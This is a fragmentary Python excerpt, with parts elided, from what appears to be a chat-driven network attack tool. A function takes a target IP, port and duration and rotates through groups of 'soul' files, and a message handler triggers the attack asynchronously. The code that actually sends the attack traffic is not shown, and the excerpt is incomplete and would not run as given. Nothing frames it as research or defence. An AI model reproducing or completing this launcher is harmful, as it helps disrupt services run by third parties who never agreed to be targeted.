...
async def run_attack_command_async(target_ip, target_port, duration):
    # Define 9 groups of files
    groups = [
        ["soul.txt", "soul2.txt"],
        ["soul3.txt", "soul4.txt"],
        ["soul5.txt", "soul6.txt"],
        ["soul7.txt", "soul8.txt"],
        ["soul9.txt", "soul10.txt"],
        ["soul11.txt", "soul12.txt"],
        ["soul13.txt", "soul14.txt"],
        ["soul15.txt", "soul16.txt"],
        ["soul17.txt", "soul18.txt"]
    ]
    ...
    # Process all files in the current group
    for current_file in current_group:
        try:
    ...
    logging.info(f"Switching to group {current_group_index + 1} for the next attack command.")
...
def process_attack_command(message):
    try:
        ...
        # Dynamically call the attack function using asyncio
